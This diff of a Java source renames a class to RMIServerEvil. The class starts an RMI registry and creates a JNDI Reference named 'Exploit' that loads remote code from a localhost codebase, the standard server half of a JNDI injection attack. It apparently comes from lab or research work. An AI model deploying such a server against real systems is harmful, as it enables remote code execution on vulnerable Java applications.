@@ -6,7 +6,7 @@ import javax.naming.Reference;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
 
-public class RMIServer {
+public class RMIServerEvil {
     public static void main(String[] args) throws Exception{
         Registry registry = LocateRegistry.createRegistry(1099);
         Reference reference = new Reference("Exploit","Exploit","http://127.0.0.1:65500/");
